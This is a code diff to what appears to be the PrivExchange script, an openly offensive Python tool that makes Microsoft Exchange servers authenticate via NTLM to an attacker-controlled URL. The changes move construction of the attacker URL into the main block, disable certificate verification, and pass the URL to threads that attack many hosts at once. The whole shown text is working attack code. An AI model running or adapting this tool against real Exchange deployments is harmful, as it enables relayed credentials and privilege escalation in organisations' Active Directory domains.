@@ -4,6 +4,8 @@
 #
 # Copyright (c) 2019 Dirk-jan Mollema
 #
+# Minor fixes by @byt3bl33d3r
+#
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
@@ -66,31 +68,19 @@ POST_BODY = '''<?xml version="1.0" encoding="UTF-8"?>
 
 EXCHANGE_VERSIONS = ["2010_SP1","2010_SP2","2013","2016"]
 
-def do_privexchange(host):
+def do_privexchange(host, attacker_url):
     # Init connection
     if not args.no_ssl:
         # HTTPS = default
-        port = 443
-        if args.exchange_port:
-            port = int(args.exchange_port)
-        try:
-            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
-            session = HTTPSConnection(host, port, timeout=args.timeout, context=uv_context)
-        except AttributeError:
-            session = HTTPSConnection(host, port, timeout=args.timeout)
+        port = 443 if not args.exchange_port else int(args.exchange_port)
+        uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+        uv_context.verify_mode = ssl.CERT_NONE
+        session = HTTPSConnection(host, port, timeout=args.timeout, context=uv_context)
     else:
         # Otherwise: HTTP
-        port = 80
-        if args.exchange_port:
-            port = int(args.exchange_port)
+        port = 80 if not args.exchange_port else int(args.exchange_port)
         session = HTTPConnection(host, port, timeout=args.timeout)
 
-    # Construct attacker url
-    if args.attacker_port != 80:
-        attacker_url = 'http://{}:{}{}'.format(args.attacker_host, int(args.attacker_port), args.attacker_page)
-    else:
-        attacker_url = 'http://{}{}'.format(args.attacker_host, args.attacker_page)
-    logging.info('Using attacker URL: {}'.format(attacker_url))
     # Use impacket for NTLM
     ntlm_nego = ntlm.getNTLMSSPType1(args.attacker_host, domain=args.domain)
 
@@ -225,12 +215,19 @@ if __name__ == '__main__':
     if args.password is None and args.hashes is None:
         args.password = getpass.getpass()
 
+    # Construct attacker url
+    attacker_url = 'http://{}{}'.format(args.attacker_host, args.attacker_page)
+    if args.attacker_port != 80:
+        attacker_url = 'http://{}:{}{}'.format(args.attacker_host, int(args.attacker_port), args.attacker_page)
+
+    logging.info('Using attacker URL: {}'.format(attacker_url))
+
     with concurrent.futures.ThreadPoolExecutor(max_workers=len(args.hosts)) as executor:
-        tasks = {executor.submit(do_privexchange, host): host for host in args.hosts}
+        tasks = {executor.submit(do_privexchange, host, attacker_url): host for host in args.hosts}
 
         for future in concurrent.futures.as_completed(tasks):
             url = tasks[future]
             try:
-                result = future.result()
+                future.result()
             except Exception as e:
                 logging.error("Got exception for host {}: {}".format(url, e))
